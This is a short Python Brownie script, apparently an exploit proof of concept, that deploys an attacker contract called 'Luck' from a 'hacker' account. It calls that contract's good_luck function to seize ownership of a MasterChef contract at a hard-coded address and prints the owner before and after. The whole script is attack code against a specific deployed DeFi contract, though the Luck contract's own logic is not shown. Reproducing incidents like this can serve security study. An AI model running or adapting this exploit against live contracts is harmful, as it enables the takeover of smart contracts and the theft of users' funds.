from brownie import accounts, interface, network, Luck 

cross_master_chef = interface.IMasterChef('0x70873211CB64c1D4EC027Ea63A399A7d07c4085B')

def main():
    hacker = accounts[0]
    print('deploy contract luck...')
    luck = Luck.deploy({'from': hacker})
    print('[Before] the owner of cross is: ', cross_master_chef.owner())
    luck.good_luck({'from': hacker})
    print(f'[After] the owner of cross is: {cross_master_chef.owner()} (BTW: the addres of luck is {luck.address})')
    # For macbook
    network.disconnect()